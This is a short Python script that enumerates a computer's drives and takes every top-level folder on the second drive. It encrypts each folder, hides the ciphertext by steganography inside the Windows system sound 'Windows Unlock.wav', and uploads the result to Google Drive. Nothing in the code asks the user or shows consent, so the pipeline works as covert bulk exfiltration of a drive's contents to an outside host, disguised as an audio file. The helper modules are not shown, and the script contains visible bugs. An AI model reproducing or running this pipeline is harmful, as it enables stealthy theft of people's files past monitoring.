import Encryption_Folder
import Audio_Steganography
import Google_Drive_API
import os
import psutil

# To Check A File
def list_drive_letters():
    drive_letters = set()
    partitions = psutil.disk_partitions(all=True)

    for partition in partitions:
        if partition.device and partition.mountpoint:
            drive_letter = partition.device[0].upper() + ":"
            drive_letters.add(drive_letter)

    return sorted(drive_letters)

drive_letters = list_drive_letters()

print(drive_letters[1])

A=drive_letters[1]

drive_letter = A+"/"  # Change this to the drive letter you want to list folders from

if os.path.exists(drive_letter) and os.path.isdir(drive_letter):
    folder_names = [d for d in os.listdir(drive_letter) if os.path.isdir(os.path.join(drive_letter, d))]
    
else:
    print(f"The drive {drive_letter} does not exist or is not a valid directory.")


for folder in folder_names:
        # print(f"Folders in {drive_letter}:")
        Main_File_Path=f'{drive_letter}{folder}'
        

        #Define Path For Aceess
        # Main_File_Path=r'E:\Codeing\Python Language\Projects\Project_14_Crypto_Stegano_Graphy\User_Data'
        Steganography_Audio = "C:\Windows\Media\Windows Unlock.wav"  # Your input audio file
        Steganography_Audio_Output = r"C:\Users\Music_With_Hidden_Message.wav"


        #Step-1
        Setp_1=Encryption_Folder.Encrypt(Main_File_Path)

        Setp_2=Audio_Steganography.Embed_message(Steganography_Audio,Setp_1,Steganography_Audio_Output)

        Google_Drive_API.Google_Drive_API(Setp_2,folder)


